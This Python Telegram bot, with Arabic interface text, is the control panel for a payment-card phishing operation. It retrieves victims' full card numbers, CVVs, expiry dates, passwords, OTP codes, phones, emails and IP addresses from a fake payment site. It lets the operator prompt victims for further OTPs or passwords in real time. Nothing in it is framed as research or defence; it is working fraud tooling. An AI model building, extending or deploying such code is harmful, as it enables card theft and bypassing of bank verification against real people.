import os
import requests
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

load_dotenv()
BOT_TOKEN = os.getenv('BOT_TOKEN')
WEBSITE_URL = os.getenv('WEBSITE_URL', 'http://localhost:5000')
ADMIN_IDS = set()

def update_payment_status(payment_id, status):
    try:
        requests.post(f"{WEBSITE_URL}/api/update_status", json={"payment_id": payment_id, "status": status}, timeout=5)
    except:
        pass

def request_otp(payment_id):
    try:
        requests.post(f"{WEBSITE_URL}/api/request_otp", json={"payment_id": payment_id}, timeout=5)
    except:
        pass

def request_password(payment_id):
    try:
        requests.post(f"{WEBSITE_URL}/api/request_password", json={"payment_id": payment_id}, timeout=5)
    except:
        pass

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ADMIN_IDS:
        ADMIN_IDS.add(user.id)
        await update.message.reply_text(
            f"🎉 <b>تم تسجيلك كأدمن!</b>\n\n"
            f"👤 الاسم: {user.first_name}\n"
            f"🆔 الـ ID: <code>{user.id}</code>\n\n"
            f"من الآن رح تستقبل إشعارات الدفع هنا.",
            parse_mode='HTML'
        )
    await show_menu(update, context)

async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📊 جميع المدفوعات", callback_data="all")],
        [InlineKeyboardButton("⏳ قيد الانتظار", callback_data="pending")],
        [InlineKeyboardButton("✅ المقبولة", callback_data="approved")],
        [InlineKeyboardButton("❌ المرفوضة", callback_data="rejected")]
    ]
    await update.message.reply_text(
        "🔧 <b>لوحة تحكم الأدمن</b>\n\nاختر من القائمة:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def send_payment_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ADMIN_IDS:
        await update.message.reply_text("🚫 غير مصرح!")
        return
    if not context.args:
        await update.message.reply_text(
            "📋 <b>كيف تبعت رابط الدفع:</b>\n\n"
            "استخدم: /paylink [المبلغ]\n"
            "مثال: /paylink 100",
            parse_mode='HTML'
        )
        return
    amount = context.args[0]
    payment_link = f"{WEBSITE_URL}?amount={amount}"
    await update.message.reply_text(
        f"🔗 <b>رابط الدفع جاهز!</b>\n\n"
        f"💰 المبلغ: ${amount}\n"
        f"🔗 الرابط: {payment_link}",
        parse_mode='HTML'
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("🚫 غير مصرح!")
        return
    data = query.data
    if data.startswith("accept_"):
        pid = data.replace("accept_", "")
        update_payment_status(pid, "approved")
        await query.edit_message_text(f"✅ تم قبول الدفع: <code>{pid}</code>", parse_mode='HTML')
    elif data.startswith("reject_"):
        pid = data.replace("reject_", "")
        update_payment_status(pid, "rejected")
        await query.edit_message_text(f"❌ تم رفض الدفع: <code>{pid}</code>", parse_mode='HTML')
    elif data.startswith("request_otp_"):
        pid = data.replace("request_otp_", "")
        request_otp(pid)
        await query.edit_message_text(f"📱 تم طلب OTP لـ: <code>{pid}</code>", parse_mode='HTML')
    elif data.startswith("request_pass_"):
        pid = data.replace("request_pass_", "")
        request_password(pid)
        await query.edit_message_text(f"🔑 تم طلب كلمة السر لـ: <code>{pid}</code>", parse_mode='HTML')
    elif data.startswith("view_"):
        pid = data.replace("view_", "")
        try:
            res = requests.get(f"{WEBSITE_URL}/api/all", timeout=5)
            payment = res.json().get(pid, {})
        except:
            payment = {}
        if not payment:
            await query.edit_message_text("❌ العملية غير موجودة!")
            return
        status = payment.get('status', 'pending')
        status_emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌", "needs_otp": "📱", "needs_password": "🔒"}.get(status, "⏳")
        text = (
            f"📋 <b>تفاصيل العملية الكاملة</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>رقم العملية:</b> <code>{pid}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 <b>رقم البطاقة:</b> <code>{payment.get('card_number', 'غير متوفر')}</code>\n"
            f"👤 <b>اسم صاحب البطاقة:</b> {payment.get('card_holder', 'غير متوفر')}\n"
            f"📅 <b>تاريخ الانتهاء:</b> {payment.get('expiry_month', '??')}/{payment.get('expiry_year', '??')}\n"
            f"🔒 <b>CVV:</b> <code>{payment.get('cvv', 'غير متوفر')}</code>\n"
            f"🔑 <b>كلمة السر:</b> <code>{payment.get('password', 'غير متوفر')}</code>\n"
            f"📱 <b>OTP:</b> <code>{payment.get('otp', 'غير متوفر')}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 <b>المبلغ:</b> {payment.get('amount', '0')} {payment.get('currency', 'USD')}\n"
            f"📧 <b>الإيميل:</b> {payment.get('email', 'غير متوفر')}\n"
            f"📱 <b>الهاتف:</b> {payment.get('phone', 'غير متوفر')}\n"
            f"🌐 <b>IP:</b> <code>{payment.get('ip', 'غير متوفر')}</code>\n"
            f"⏰ <b>الوقت:</b> {payment.get('timestamp', 'غير متوفر')}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📊 <b>الحالة:</b> {status_emoji} <b>{status.upper()}</b>"
        )
        keyboard = []
        if status == 'pending':
            keyboard = [
                [InlineKeyboardButton("✅ قبول الدفع", callback_data=f"accept_{pid}"),
                 InlineKeyboardButton("❌ رفض الدفع", callback_data=f"reject_{pid}")],
                [InlineKeyboardButton("🔑 طلب OTP", callback_data=f"request_otp_{pid}"),
                 InlineKeyboardButton("🔒 طلب كلمة سر", callback_data=f"request_pass_{pid}")]
            ]
        keyboard.append([InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    elif data in ["all", "pending", "approved", "rejected"]:
        try:
            res = requests.get(f"{WEBSITE_URL}/api/all", timeout=5)
            all_payments = res.json()
        except:
            all_payments = {}
        filtered = {k: v for k, v in all_payments.items() if data == "all" or v.get('status') == data}
        if not filtered:
            await query.edit_message_text(f"📭 لا توجد مدفوعات في هذا القسم!")
            return
        text = f"📋 <b>المدفوعات ({len(filtered)})</b>\n\n"
        keyboard = []
        for pid, p in list(filtered.items())[:10]:
            emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌", "needs_otp": "📱", "needs_password": "🔒"}.get(p.get('status'), "⏳")
            text += f"{emoji} <code>{pid[:10]}...</code> - ${p.get('amount', '0')}\n"
            keyboard.append([InlineKeyboardButton(f"{emoji} {pid[:8]}... ${p.get('amount', '0')}", callback_data=f"view_{pid}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    elif data == "back":
        await show_menu(update, context)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("paylink", send_payment_link))
    app.add_handler(CallbackQueryHandler(callback_handler))
    print("🤖 Bot started! Send /start to become admin.")
    app.run_polling()

if __name__ == '__main__':
    main()
        
